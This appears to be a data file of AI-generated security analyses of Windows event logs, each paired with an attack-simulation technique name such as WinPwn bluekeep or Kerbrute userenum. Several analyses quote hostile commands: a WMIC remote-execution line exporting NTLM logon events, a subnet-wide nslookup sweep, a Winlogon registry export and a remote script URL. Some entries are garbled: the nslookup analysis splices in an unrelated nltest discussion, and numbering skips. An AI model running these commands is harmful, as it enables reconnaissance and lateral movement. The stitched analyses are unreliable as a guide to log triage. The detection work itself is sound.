   - Several processes were executed under `NT AUTHORITY\SYSTEM`, indicating these actions were performed with the highest privileges on the system which is often exploited during a compromise.

### Assessment
- The presence of `AdFind.exe` and frequent use of utility tools like `wevtutil.exe` under potentially obfuscated command lines is particularly concerning. These tools are not typically used during regular operation and are often linked to enumeration and log tampering attempts by cyber attackers.

### Risk and Threats
- **Enumeration and Reconnaissance**: `AdFind.exe` is commonly used for directory enumeration.
- **Log Tampering**: Usage of `wevtutil.exe` might indicate efforts to modify or clear event logs.
- **Execution of Scripts**: Execution of tools in directories typically used for temporary storage or external downloads can be signs of attempts to execute scripts without authorization.

### Recommendation
- **Immediate Investigation**: Further scrutinize the origin and intent behind the execution of `AdFind.exe` and `wevtutil.exe`.
- **User Verification**: Verify actions taken by the user account `SERVER002\admin_test` to ensure no unauthorized script or action was performed.
- **Monitor and Isolate**: Continue to monitor `Server002` for additional suspicious activities and consider isolating the system to prevent further potential spread if malicious activity is confirmed.

### Conclusion
Based on the logs and analysis, the activity is deemed **SUSPICIOUS** and warrants further investigation. There are clear indicators of potential boundary probing and log tampering attempts, both of which merit a deeper security examination to confirm intent and impact."
Wevtutil - Discover NTLM Users Remote,"Upon reviewing the provided Windows event logs, I've identified some key indicators that raise concerns about potential malicious activity on the system, particularly involving PowerShell commands and remote command execution.

### Analysis:

**1. Suspicious PowerShell Activity:**
- **PowerShell Execution:** There are multiple logs indicating PowerShell commands being executed, particularly one involving the use of the `wmic.exe` command to extract logon events (Event ID 4776) from the `Security` log and store them in a file (`C:\\ntlmusers.evtx`). The command extracted this information remotely by targeting IP addresses obtained via DNS lookup of the logon server.
  
  ```powershell
  $target = $env:LOGONSERVER
  $target = $target.Trim(""\"")
  $IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString
  wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\\Event[System[(EventID=4776)]]\""'
  ```

  Unusual or frequent use of PowerShell to perform actions on remote machines can be indicative of lateral movement or attack like reconnaissance or credential gathering.

**2. Remote Command Execution:**
- **WMI and WMIC Usage:** The usage of WMI (Windows Management Instrumentation) command line tool (WMIC) for remote execution stands out. The ability to create processes remotely to extract event logs is concerning and could suggest unauthorized access or preparatory steps for a more extensive attack.

**3. High Integrity Execution:**
- The processes are executed at a high integrity level, which enables higher privileges, thereby increasing the risk associated with these activities.

**4. Edge Update Processes:**
- There are numerous logs related to Microsoft Edge Update processes. However, these appear to be typical update processes and don't seem directly related to malicious activity given the context provided.

**Miscellaneous Observations:**
- There are a series of Edge-related updates occurring, which do not appear interconnected with the suspicious PowerShell and WMIC activities. These could potentially be unrelated but raise concerns regarding overlap with scheduled task creation or modification to maintain persistence.

### Assessment:

**Resolution: SUSPICIOUS**

There are clear signs of unusual and potentially malicious activities involving PowerShell command execution, remote log extraction, and usage of `WMIC` for remote process creation, which warrant further investigation. Although direct evidence pointing to malicious intent isn't unequivocal, these activities strongly deviate from normal operational conduct. It is recommended to:

- **Conduct a thorough security assessment** on the machine, checking for additional indicators of compromise (IOCs) like unusual scheduled tasks, or changes in privilege levels.
- **Review user account activities and permissions**, focusing on the accounts active during these log timestamps.
- **Check external network connections** associated with this machine during the timeframe to detect potential exfiltration or command/control communications.
- **Perform a full malware scan** on Server002 to ensure no malicious scripts reside.
- **Enhance logging and monitoring** specifically for PowerShell activities across potentially affected systems.
  
Given the potential risk, it's critical to deepen the investigation while enacting precautionary measures to mitigate further unauthorized access."
List Mozilla Firefox bookmarks on Windows with command prompt,"After a thorough examination of the provided Windows event logs, here is a summary of key events, highlighting potential suspicious or malicious activities:

### Key Observations:

1. **Windows Security Logs:**
   - **Multiple 4624 and 4672 Events:** Numerous logon types and special privileges assignments for `NT AUTHORITY\SYSTEM` which are quite normal for system-related activities. Logon Type 5 typically signifies a service startup.
   - **Repeated 4798 Events:** Indicating enumeration of local group memberships. This could potentially be concerning if seen in abnormal frequency or context, but given it is executed by `taskhostw.exe`, this might be part of a scheduled task or routine administrative script execution.
   
2. **Sysmon Logs:**
   - **Use of Common Utility Programs (HOSTNAME.EXE, whoami.exe, where.exe):** These were executed by `admin_test`, indicating checks for system and user information. While not inherently malicious, their context is important for understanding if they are part of legitimate scripts or admin tasks.
   - **Edge Update Processes:** Multiple events related to `MicrosoftEdgeUpdate.exe` which is part of automatic updates for Microsoft Edge. This is typical behavior but could be unusual if occurring too frequently in short intervals or outside normal maintenance windows.
   - **Command-Line Usage in CMD.EXE:** Use of `cmd.exe` to search through directories is not typical in all environments but can be a legitimate administrative activity. However, in adversarial engagements, similar actions are taken for discovery.

3. **Application Logs:**
   - **SPP Service Events:** Frequent events involving `Software Protection Platform Service` which is typical in managing software licensing.

4. **Pattern of Activity:**
   - Overall, the pattern reveals many logs around system processes and edge updates, frequent enumeration, and system diagnostics which can occur in maintenance activities.
   
### Assessment:
Upon examining the frequency and context of these events, there is no unmistakable evidence of malicious activities, such as known malware execution patterns or clear exploitation indicators. However, the enumeration of user groups (events 4798), though not uncommon, should be monitored if occurring outside routine schedules or coupled with other suspicious activities.

### Resolution:
The activities observed fall possibly within maintenance or administrative tasks. Therefore, a rating of **SUSPICIOUS** is appropriate due to the need to confirm that these were part of legitimate tasks.

#### Guidance:
- **Verification and Confirmation:** Check through organizational procedures and logs to confirm these processes and command executions as part of scheduled tasks or known administrative actions.
- **User and Access Verification:** Verify the 'admin_test' user and if their activities align with their role expectations.
- **Baseline Establishment:** Establish operational baselines to distinguish everyday activity from anomalies in future analyses."
Kerbrute - userenum,"Based on the provided event logs, we analyzed the various entries from different log types like Sysmon, Windows PowerShell, Application, and Security logs. Here is a detailed analysis of potentially suspicious activities observed:

### Observations:

1. **Unusual PowerShell Activity:**
   - Multiple instances of `PowerShell.exe` with suspicious command-line arguments are observed. Specifically, there appears to be a script execution from a temporary external files location (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\script.exe`), executing a command `userenum` which can be indicative of user enumeration activities.
   - This usage of an executable from a temporary location is often indicative of suspicious behavior, as it can be used by malicious actors to execute arbitrary code.

2. **Process Relationships:**
   - Processes like `conhost.exe` and `wevtutil.exe` are observed frequently, running under the same user (`SERVER002\\admin_test`). While `conhost.exe` is a legitimate Windows process, its association here multiple times in close temporal proximity to `PowerShell.exe` can suggest attempts to obfuscate or hide true malicious activities.
   - `wevtutil.exe` is used for managing event logs, and its presence is noteworthy. However, without precise command-line arguments, its intent cannot be fully understood.

3. **Command-Line Execution Integrity Levels:**
   - Processes such as `HOSTNAME.EXE`, `whoami.exe`, and `PowerShell.exe` run at a high integrity level, indicating elevated privileges during execution. The invocation of `whoami.exe`, a utility to display the current user's information, is often used to gather environment information which could indicate reconnaissance activities.

4. **Security Events:**
   - The logs captured privilege assignments and logon events which, on their own, appear legitimate for system and service accounts.
   - Credential activities (Event ID 5379) related to unsuccessful operations involving MicrosoftAccount are noted, but no direct indication of compromise is visible here.

5. **Windows Defender Reports:**
   - The `Application` logs indicate that Windows Defender is in a known secure state (`SECURITY_PRODUCT_STATE_ON`), which suggests that the built-in defenses are operational, but it might not have detected the suspicious activities flagged above.

### Assessment:

- **Suspicious**: The logs reveal several red flags typically associated with unauthorized internal reconnaissance or preparatory activity for a broader exploit. The execution of `PowerShell` with scripts located in a temporary directory and commands aimed at enumerating users could indicate intrusion attempts.

### Guidance:

- **Immediate Next Steps**: 
  1. Isolate the `Server002` from the network to prevent further potential lateral movement or data exfiltration.
  2. Initiate a detailed incident response investigation focusing on the affected machine to identify the origin and full extent of the activity.
  3. Review the scripts and files found in temporary directories and analyze them in a controlled environment to understand their capabilities.
  4. Enhance the monitoring for similar behavior across other systems and set alerts for suspicious PowerShell activities.
  5. Conduct a thorough review of user privileges and other processes ran by this account recently to determine if further unauthorized actions were performed.

In summary, further investigation is warranted due to the suspicious nature of PowerShell command executions and potential reconnaissance activities."
WinPwn - bluekeep,"### Detailed Analysis of the Logs

#### Suspicious and Anomalous Behavior

1. **Time Discrepancy and System Time Manipulation:**
   - There were multiple `EventID 4616` events involving `svchost.exe` that indicate a change in system time. The system time was set back from `2024-11-02 10:15:51` to `2024-11-02 10:15:39`. 
   - Time manipulation can be a technique used by attackers to evade detection or to ensure the proper execution of time-sensitive malicious activities.

2. **Abuse of Privileges:**
   - The `EventID 4672` shows user `admin_test` receiving a range of high privileges, such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges could be misused for malicious purposes such as privilege escalation or system manipulation.

3. **Unexpected PowerShell Activity:**
   - A `powershell.exe` process (`EventID 1` in Sysmon log) executed a script from a remote URL (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`). 
   - The script involves a non-standard command where it appears to reference `bluekeep`, suggesting an exploit or a tool potentially associated with a vulnerability in RDP.

4. **Unusual Process Behavior:**
   - Multiple `wevtutil.exe` and `conhost.exe` executions by `admin_test` and `SYSTEM` suggest potential tampering with event logs or attempts to interact with the console in an unusual manner.

#### Indication of Malicious Activity

- The attempt to run a PowerShell script from a remote source is highly suspicious and falls under potentially malicious behavior, especially when combined with time tampering and elevated privileges.
- The presence of `bluekeep` in the PowerShell command indicates a potential exploitation attempt.
  
### Assessment of the Situation

- There are clear indicators of unauthorized and potentially malicious activities, particularly the execution of scripts via PowerShell from an untrusted source and attempts to manipulate system time.
- The high privileges gained by the `admin_test` user further supports the possibility of compromise.

### Identified Threats and Risks

- **Privilege Escalation**: The high privileges granted to `admin_test` may allow for full control over the system.
- **Remote Code Execution**: The PowerShell activity suggests potential remote code execution, likely targeting known vulnerabilities.
- **Log Tampering**: The use of `wevtutil.exe` indicates potential log clearing or event log manipulation.

### Guidance on How to Proceed

1. **Immediate Isolation**: Isolate the affected system (Server002) from the network to prevent further malicious activity or spread.
2. **Conduct a Full Forensic Analysis**: Collect further forensic evidence from the system, including a memory dump and more comprehensive system logs.
3. **Reverse PowerShell Script**: Analyze the flagged PowerShell script further to understand its full impact and actions.
4. **Patch and Update**: Ensure all systems are patched, particularly focusing on vulnerabilities like BlueKeep if applicable.
5. **Incident Response**: Initiate an incident response protocol and inform relevant stakeholders within the organization.

### Conclusion

**Resolution: MALICIOUS** - The logs demonstrate clear signs of malicious activity involving privilege escalation, potential RDP exploitation, and execution of a potentially harmful script. The system requires immediate attention and remediation."
Process Discovery - tasklist,"Upon reviewing the provided Windows event logs, the following points of interest and concern have been identified:

1. **Time Change Events**:
   - Multiple logs indicate a backdating of the system time on ""Server002"". The time was set back from ""2024-10-22 19:11:37"" to ""2024-10-22 19:11:08"". These events are logged with `EventID 24` and `EventID 1` from `Microsoft-Windows-Kernel-General`. Such changes can indicate attempts to manipulate time for evading time-based security controls or log orchestation.

2. **Process Execution Events**:
   - Several processes executed include benign system utilities like `whoami.exe`, `hostname.exe`, `cmd.exe`, `tasklist.exe`, and `wevtutil.exe`. These processes might suggest normal administrative activity or an examination of the system environment. However, they often appear in post-compromise scenarios where an attacker tries to gather information, modify logs, or hide activity.
   - The processes are all executed by the `SERVER002\admin_test` user, suggesting either legitimate administrative tasks or a compromised account since all activities executed under high integrity level.

3. **Repeated `svchost.exe` Events**:
   - Numerous `svchost.exe` interactions are observed. While this is a legitimate Windows process, its frequent and close-time occurrence along with the time change may be indicative of abuse, possibly to mask or influence service behavior tied to logs or system checks.

4. **Frequency and Grouping of Commands**:
   - The commands `whoami.exe`, `hostname.exe`, `tasklist.exe`, and `wevtutil.exe` are executed in close proximity and at high frequency which can suggest script-driven activity indicative of an automated attack sequence or reconnaissance efforts.

5. **Security and Application Logs**:
   - Security logs reflected time changes (`EventID: 4616`), reinforcing possible tampering or evasion attempts.
   - There's a recorded event under `Microsoft-Windows-Security-SPP` for the `Software Protection Platform Service`, which, in this context, doesn't appear directly malicious but serves as another time marker surrounding other suspicious activity.

**Assessment**:
Given the evidence, the activity in the logs raises significant red flags. The repeated time changes, combined with sequential execution of various system commands, suggest potential malicious activity, likely involving reconnaissance or preparatory steps for a more complex exploitation.

**Resolution**: **SUSPICIOUS**

**Guidance**:
1. **Immediate Actions**:
   - Isolate the affected system to prevent potential lateral movement.
   - Conduct a thorough investigation on `admin_test` user account to verify its integrity and any unauthorized access.
   - Review and cross-check physical or scheduled administrative actions during the log's timeframe with legitimate usage patterns.

2. **Further Investigation**:
   - Analyze additional logs correlating with network activity or other system logon sessions to identify potential data exfiltration or unauthorized access points.
   - Trace the sequence of command-line executions to understand the full scope and intention of the activity observed.
   - Verify and validate system time settings to ensure no further tampering occurs.

3. **Remedial Measures**:
   - If there's confirmation of compromise, initiate incident response protocols, including password resets, detailed malware analysis, and forensic investigation to remove persistent threats.
   - Strengthen auditing and monitoring measures, including alerts for unusual time changes and unexpected high-frequency execution of administrative tools."
Applications Installed,"After thoroughly analyzing the Windows event logs provided, the following observations and assessments have been made:

### Suspicious and Anomalous Behaviors:

1. **Repeated Time Change Events:**
   - The system logs indicate multiple instances of the system time being updated within a very short time frame by the `svchost.exe` process. This is captured by events in both the System and Security logs with Event IDs 24 and 4616, respectively. Time changes are not inherently malicious, but frequent changes without clear justification could indicate malicious tampering or an effort to confuse event log timelines.

2. **PowerShell Usage:**
   - The PowerShell logs contain an entry showing a command that retrieves registry entries related to installed software using `Get-ItemProperty` on uninstall registry paths. While this command itself is not immediately suspicious, the context—in particular, its execution without clear administrative intent—could indicate enumeration activities which are often seen in reconnaissance phases of attacks.

3. **High Frequency of Process Creation:**
   - The Sysmon logs show numerous process creations for standard Windows processes such as `hostname.exe`, `conhost.exe`, and `whoami.exe`. There seems to be a repetition of what appears to be typical benign commands (e.g., `whoami`), which could suggest script-based execution potentially for gathering system and user information.

4. **Repeated Usage of System Processes:**
   - The application of processes like `wevtutil.exe`, which is used for managing event logs, could be a method for manipulating or extracting event logs outside regular administrative activity.

### Assessment of Potential Malicious Activity:

- **Indicators of Reconnaissance and Enumeration:**
  The PowerShell command used to list installed software, combined with `whoami`, suggests a potential effort to gather data about the system and user privileges.

- **Potential Log Cleansing Activity:**
  The frequent invocation of `wevtutil.exe` within a short timeframe in the Sysmon logs might indicate an attempt to interact with or manipulate event logs, a common step in covering tracks post-intrusion.

Based on the analysis, both the suspicious execution patterns of administrative tools and the frequent occurrence of process executions and time changes without clear justification suggest the possibility of malicious intent.

### Final Conclusion and Recommendation:

**Resolution: SUSPICIOUS**

The activities observed are not definitively malicious but require further investigation to rule out malicious intent. Steps to proceed should include:
- Conducting a forensic review of the system to determine if these actions were authorized or part of a pre-approved script or administrative task.
- Reviewing additional logs to identify any external connections or anomalies around the timeframe of these events.
- Enhancing monitoring of PowerShell and other administrative tools while ensuring their usage is strictly controlled and justified.
- Further checking other systems for similar patterns to determine if this activity is isolated or part of a broader attempt across systems.

If more evidence is found to confirm misuse, escalate the investigation for incident response and contain the potentially compromised system."
Enumerate Active Directory Computers with Get-AdComputer,"**Analysis:**

1. **Windows Update Activity:**
   - The system logs indicate multiple Windows Defender updates (EventID 44, 43, 19) which are expected for regular security updates.
   - The use of `wuauclt.exe` in the Sysmon logs further indicates legitimate Windows update activities. The processes `wuauclt.exe`, `AM_Delta.exe`, and `MpSigStub.exe` are associated with Windows updates and Microsoft Defender updates, which appear legitimate given the context provided by the system log.

2. **PowerShell Activity:**
   - A PowerShell session was initiated with the command `""powershell.exe"" & {script -Filter *}`. The absence of a clear script path or location makes it slightly odd but not immediately indicative of malicious behavior alone.
   - The PowerShell session appears to have quickly transitioned from 'Started' to 'Stopped', which may suggest a short-lived session.

3. **Process Executions:**
   - The Sysmon logs capture execution events for standard Windows utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe`). The processes are executed by `admin_test`, which aligns with typical administrative tasks. However, the tight sequence and simultaneous use of multiple instances of `wevtutil.exe` and `conhost.exe` could be seen as excessive for standard administration, which deserves closer scrutiny for unusual patterns.
   
4. **Security Log:**
   - Consistent EventIDs of 5379 showing failed credential accesses are not uncommon and often occur with frequent credential checks. The `ReturnCode` of `3221226021` indicates there were no credentials returned, which might align with routine operations that were unsuccessful rather than out-and-out suspicious behaviors.

5. **Indicator of Potential Risk:**
   - The PowerShell execution combined with the short lifespan (and lack of clarity in the script being executed) typically warrants further investigation.
   - The numerous and closely timed `wevtutil.exe` and `conhost.exe` executions are worth deeper look for possible script automation or unintended behavior.

**Assessment:**

The logs show standard system activity with legitimate windows updating processes and system utility executions. However, the rate and pattern of these activities raise potential ""suspicious"" flags concerning script automation or misuse of administrative privileges.

**Resolution: - SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct further investigation into the purpose and necessity of the PowerShell command and verify if it was initiated by a legitimate user action.
- Analyze the context and frequency of utilities like `wevtutil.exe` and `conhost.exe` executions, especially to rule out scripted actions or unauthorized automation.
- Monitor further credential checks for occurrences of ReturnCode `3221226021` to confirm these end-user activities align with expected behavior and don’t indicate attempted unauthorized access.
- Maintain user activity logs to cross-reference human activity timings with the execution logs for processes identified."
Network Share Discovery command prompt,"Upon reviewing the provided logs, here's a detailed analysis highlighting both routine and potentially suspicious activities:

### Application Log
- Several instances of the ""edgeupdate"" service being stopped are noted. While frequent service stops might be considered normal depending on updates or configurations, this could be used as a tactic by malware to disable certain protections. However, these logs alone do not confirm malicious behavior.

### Sysmon Log
- There is noticeable repetitive activity involving `wevtutil.exe` and `conhost.exe`, executed by the user `SERVER002\\admin_test`. `wevtutil.exe` is a legitimate Windows utility for event log management, and its use could be part of routine maintenance. However, in the context of potential threat actor activities, it could also indicate log clearing or manipulation.
- Various legitimate Windows processes such as `cmd.exe`, `net.exe`, and `whoami.exe` have been executed by `SERVER002\\admin_test`. The `cmd.exe` is seen with command `/c net view \\localhost`, which might be normal network enumeration but can also reflect early reconnaissance by an attacker.
- The logs show extensive activity of `MicrosoftEdgeUpdate.exe`, executed under `NT AUTHORITY\SYSTEM`, which seems consistent with an automated update activity. However, the frequency and volume of these executions bear further scrutiny to ensure they are part of expected software update processes.

### System & Security Logs
- Multiple time adjustment (Event ID 4616) entries are present, indicating changes to the system time, which, depending on context, might be suspicious if it occurred without authorization or as an attempt to defeat time-based security mechanisms.
- Logs reflect a successful logon (Event ID 4624) using NTLM from an external IP address (`192.168.0.102`). Depending on the context and the network architecture, remote logons may be normal or could indicate a compromised account being accessed remotely.

### General Assessment
- **Suspicious Behavior**: There are some activities that warrant further investigation:
  - The frequent `wevtutil.exe` and `conhost.exe` invocations by `admin_test`.
  - The system time changes without any corresponding update/install event might seem unusual.
  - External access with NTLM authentication from an IP on `192.168.0.0/16` could indicate lateral movement, assuming once system's internal IP range starts from this subnet it might be normal otherwise require verification.
  
### Final Resolution
Based on the detailed analysis above, while much of the activity could be benign, the usage of system utilities and the external logon warrant additional scrutiny.

**Resolution**: **SUSPICIOUS**

### Recommendations
1. **Review Account Activity**: Conduct a detailed review of `admin_test` account activities, focusing on justification for using certain system utilities and external logon behaviors.
2. **Network Traffic Analysis**: Verify the source IP address `192.168.0.102` to determine if it aligns with known and authorized devices within the network.
3. **Further Log Investigation**: Look for any signs of privilege escalation or abnormal time adjustments that correspond with critical system changes or suspicious log entries.
4. **Endpoint Review**: Conduct a thorough review if the machine has any unusual network, file, or process behaviors that could indicate compromise.
5. **Consult IT Admins**: Cross-reference these findings with scheduled updates or known admin activities that may justify some of this behavior."
System Information Discovery (2),"### Detailed Analysis of the Windows Event Logs

#### Summary:
The review of the provided Sysmon, System, Security, Application, and PowerShell logs from ""Server002"" predominantly shows patterns typical in Windows operational environments. However, certain behaviors merit further investigation due to their potential for misuse in malicious activities.

#### Key Observations:

1. **PowerShell Activity:**
   - PowerShell was actively used in this timeframe. The command involved significant network configuration queries and DNS testing:
     ```plaintext
     Command: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command $net_adapter=(Get-NetAdapter -IncludeHidden); ...; $output | Out-File config\PowershellInfo.log""
     ```
   - Such comprehensive data gathering may signal benign administrative tasks but also aligns with hacker reconnaissance activities.

2. **Command Line Executions:**
   - There are frequent uses of CMD.exe and WScript.exe pertaining to network and system information gathering:
     - CMD Command: `""cmd.exe"" /c wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs`
   - The consistent pattern of these processes especially running by 'admin_test' indicates scripted operations—often used for automated administrative scripts or potentially malware deployment.

3. **Registry Exports:**
   - Notable registry exports taking place from registry hives associated with system notifications and credential providers:
     - `""cmd.exe"" /c reg export ""HKLM\SYSTEM\CurrentControlSet\Control\Winlogon\Notifications"" ...`
   - While exporting registry keys might be part of backup or compliance tasks, it is also a routine part of certain malware operations.

4. **Service and Network Analysis with CMD:**
   - Evidence of the 'sc.exe' and 'net.exe' use to display and redirect service configurations and network settings present:
     - `""cmd.exe"" /c sc.exe queryex nativewifip...""

#### Assessment:
- **Suspicious Activity**: The collection of detailed network and system information, alongside registry exports, suggests activity that is uncommon for routine administrative tasks but is often associated with initial steps in cyber-attack methodologies, like reconnaissance and data harvesting.

#### Threats or Risks Identified:
- **Potential for Malicious Use**: Commands, especially via PowerShell and CMD, could be leveraged by malware or an attacker for lateral movement, data exfiltration, or further compromise of the system.
- **Privileged Access**: Observed LogonId indicates high-level admin privileges (0x13A50D), which if misused, could lead to significant credential and data theft risks.

#### Recommended Actions:
- **Immediate Investigation**: 
  - Verify the intent and necessity behind running such extensive PowerShell scripts and registry exports.
  - Check the integrity and origin of 'gatherNetworkInfo.vbs' script to ensure it is not altered or implanted by malicious actors.
- **Limit Privileges**: Review user permissions and policies for 'admin_test' to restrict potentially hazardous command-line and script executions.
- **Continuous Monitoring**: Increase, if not already present, Sysmon configuration for closer CMD, and PowerShell command monitoring and ensure alerts for unusual command patterns.

**Resolution:** Given the context and the types of activities presented, it's advised that the events and logs are marked as **SUSPICIOUS**. Immediate investigation would either confirm potential malicious activity or secure the affirmation of benign operations."
WinPwn - Dotnetsearch,"Upon reviewing the provided Windows event logs, there are several elements that stand out and hint at potential malicious activity, alongside some benign events. Below is a detailed analysis of the log entries:

### Suspicious/Anomalous Behavior:

1. **PowerShell Activity**:
   - A PowerShell script execution stands out significantly. There are multiple logs indicating the execution of PowerShell scripts hosted on an external URL (`raw.githubusercontent.com`). The command downloads and executes a remote script via a WebClient, which is a common technique used by attackers to introduce malicious scripts into a system. This behavior is concerning, particularly in sensitive environments where unauthorized script execution should be restricted.

2. **Time Changes**:
   - Certain security logs (EventID 4616) indicate time changes. While time changes themselves are not inherently malicious, they can be used to cover tracks or manipulate log entries' timestamps. The time adjustments should be checked against known maintenance activities.

3. **Sysmon Logs**:
   - The Sysmon logs show the execution of legitimate tools such as `whoami.exe`, `hostname.exe`, and `svchost.exe`. There's no immediate evidence of compromise, but the frequent invocations by a particular user (SERVER002\admin_test) alongside the PowerShell activity raises the level of suspicion, especially if this was an unexpected administrative activity.

4. **Edge Update Logs**:
   - There are numerous logs related to the updating of Microsoft Edge. Frequent updates involving identical parent-child processes and changes in executable paths might be typical if an update protocol was initiated. However, these updates should be verified to ensure no malicious spoofing is occurring using EdgeUpdate as a vector. 

### Malicious Indicators:

- The execution of remote scripts from an external URL through PowerShell is highly indicative of a malicious attempt. Without legitimate context (e.g., authorized administrative activity for system management), this activity strongly aligns with suspicious behavior commonly associated with phishing attacks or malware dropper mechanisms.

### Assessment and Resolution:

Given the suspicious PowerShell script execution and the potential for unauthorized actions, this situation indicates a significant compromise risk. Although some activities could be benign if performed by informed administrators, the remote script execution via PowerShell without clear authorization is a critical concern.

- **Resolution**: **MALICIOUS**

### Guidance:

1. **Immediate Actions**:
   - Isolate the affected host (CEO's machine) from the network to prevent further potential exploitation or spreading of malicious scripts.
   - Conduct a comprehensive forensic analysis to understand the impact and origin of the PowerShell scripts.
   - Validate whether the Microsoft Edge updates are legitimate and check if there is any suspicious behavior disguised under a typical update.

2. **Preventive Measures**:
   - Implement strict PowerShell execution policies to limit unauthorized script execution.
   - Monitor EDR solutions for similar behavior across the network.
   - Educate users about the risks of executing unknown scripts and enforce a policy for handling external scripts."
Display group policy information via gpresult,"**Detailed Analysis of the Logs**

1. **Time Manipulation Suspicion**: In the security logs, there are multiple entries related to Event ID 4616, which indicates a change in system time. These logs show the 'NewTime' preceding the 'PreviousTime'. This might suggest an attempt to manipulate system timestamps, a technique often used by attackers to hide their activities. However, this could also result from legitimate operations, such as time sync adjustments, if ntp services were involved.

2. **Frequent Execution of System Tools**: The Sysmon logs detail the execution of various legitimate Windows utilities such as `whoami.exe`, `cmd.exe`, `conhost.exe`, `gpresult.exe`, and `wevtutil.exe`. While these can be used for benign purposes, frequent and rapid execution of these tools, especially in a sequence, could indicate attempts to gather information or alter system policies. Such activities could represent reconnaissance phases of an attack.

5. **General Activity**: The operations noted in the logs represent typical system maintenance activities such as updates. It is crucial, however, to verify the legitimacy of these processes. Comparing hash values and verifying process authenticity, especially for those running from non-standard directories or with unconventional command-line arguments, would help detect malicious imitations.

**Assessment of the Situation:**

- The presence of system-time adjustments and the use of high-privilege accounts for running administrative utilities are red flags. However, they are not conclusive evidence of malicious activity without further context (i.e., network logs, user activity logs, external IDS/IPS alerts).
- Edge Update processes are suspicious but could be benign unless further investigated for anomalies like non-standard network connections or exploitation of the update mechanism.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Conduct a Memory Dump Analysis**: Collect a memory dump from the host and analyze it for potential malicious patterns, especially focusing on the processes listed in the logs.
- **Validate Timestamps and Sync Sources**: Investigate the legitimate need or lack thereof for frequent system time changes, confirm against known approved time servers.
- **Network Analysis**: Review associated network logs for unusual outgoing connections parallel to the log times, especially during the update process executions.
- **File Verification**: Use hashes from the logs to verify the integrity of the Edge Update executable if possible, checking against known-good values.
- **Behavioral Analysis**: Consider running similar process executions in a controlled environment to study any potential deviations in behavior or flag potential harmful patterns.

In the absence of further evidence confirming benign operations or malicious elements, treating these logs as suspicious warrants a cautious and detailed follow-up."

Remote System Discovery - nslookup,"### Detailed Analysis

Upon examining the provided Windows event logs, several events warrant closer scrutiny:

1. **Suspicious PowerShell Activity**:
   - Multiple entries in the Sysmon logs indicate the execution of a PowerShell script with a command aimed at enumerating IP addresses across a subnet and performing `nslookup` commands on them. The command is as follows:
     ```
     powershell.exe & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1], $pieces = $localip.split("".""), $firstOctet = $pieces[0], $secondOctet = $pieces[1], $thirdOctet = $pieces[2], foreach ($ip in 1..255 | % { ""$firstOctet.$secondOctet.$thirdOctet.$_"" } ) {cmd.exe /c nslookup $ip}}
     ```
   - This script seems to attempt a reverse DNS lookup across an entire subnet, indicative of network reconnaissance activity.

2. **Elevation of Privileges**:
   - The security logs show that the user `admin_test` was granted a series of high-level privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. While this may not inherently indicate malicious intent, coupled with the PowerShell script, it raises some concerns about possible misuse of elevated privileges.

3. **Behavioral Anomalies**:
   - The repeated execution of `whoami.exe` and `hostname.exe` in the Sysmon logs might suggest an attempt to gather user and system information. While these commands are ordinary, their frequency and the context of their execution are worth noting.

4. **Legitimate Windows Updates**:
   - There are system logs documenting the updates of Microsoft Defender Antivirus, which appear normal and do not indicate any form of compromise.

5. **Unusual Logon Activity**:
   - The Security logs show login activities related to the `admin_test` account from a different IP address (`192.168.0.102`). This can be a normal administrative activity, but given the context, it adds to the suspicious nature if it’s not regularly used by the logged-in user for remote access.

### Assessment

While some of the events contain legitimate and expected system activities (Windows Defender updates, Edge updates), several others, particularly the PowerShell scripts and elevation of privileges, raise concerns. These behaviors collectively suggest a potential reconnaissance phase in a network penetration attempt.

### Recommendation

Given the apparent signs of reconnaissance via PowerShell scripting and the potential misuse of elevated privileges, further investigation is required to determine:
- The origin and intent behind the executed PowerShell commands and whether they're part of a legitimate scanning process or a rogue activity.
- Whether the elevated privileges were granted as part of routine administrative tasks or as a precursor to unauthorized actions.

4. **Microsoft Edge Update**: The logs contain multiple entries related to `MicrosoftEdgeUpdate.exe`, and its associated components, showing various command-line arguments:
   - `/svc`, `/update`, `/regsvc`, `/ping`, and `/regserver`. 
   
   These processes appear to be legitimate update processes for Microsoft Edge, run by `NT AUTHORITY\SYSTEM`, representing typical activity of Edge being updated and registered in the system.

5. **Wevtutil.exe Execution**: `Wevtutil.exe`, a legitimate tool used to manage event logs, was executed multiple times. While this might be common administrative behavior, anomalous use (especially if targeted at logs related to investigative processes) could conceal evidence.

6. **Hostname and Whoami Execution**: These commands were executed, which may indicate an attempt to gather system-specific or session user information. This can be seen in both benign administrative scripting and malicious situations where an actor is reconnoitering an environment.

### Assessment:

- **Benign Activity Observed**: The Microsoft Edge update activities, system processes (`svchost.exe`, `sppsvc.exe`), and the typical `cmd.exe` interactions observed could be part of regular maintenance or administrative activities. 

- **Suspicious Activity Noted**: The use of `nltest` and `WHERE` to query and execute specific Windows commands, combined with the high integrity level in a short time frame, raises suspicion of reconnaissance behavior, potentially indicative of malicious intent or unauthorized administrative actions. The use of `wevtutil`, while potentially benign, should also be considered suspect in the absence of a legitimate administrative context, particularly if associated with information gathering or log manipulation activities.

### Resolution:

Based on the analysis, the activities within the logs are classified as **SUSPICIOUS**. There are behaviors which warrant further investigation, particularly concerning the use of `nltest`, `WHERE`, and the privilege level of execution. For a complete security assessment:

1. **Context Verification**: Determine if there was any legitimate administrative or maintenance activity scheduled that would explain these actions.

2. **User Account Audit**: Verify the roles and activities of the `admin_test` account, ensuring it aligns with expected administrative duties.

3. **Network Traffic Monitoring**: Observe for any anomalous or unauthorized traffic correlating to these command uses.

4. **Review System Security Configurations**: Ensure logging is sufficient and secure to capture future command executions reliably.

Proceeding with these investigations will help confirm whether the suspicious behaviors result from standard operational activities or represent a security threat."
Permission Groups Discovery PowerShell (Local),"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Security Log Analysis:

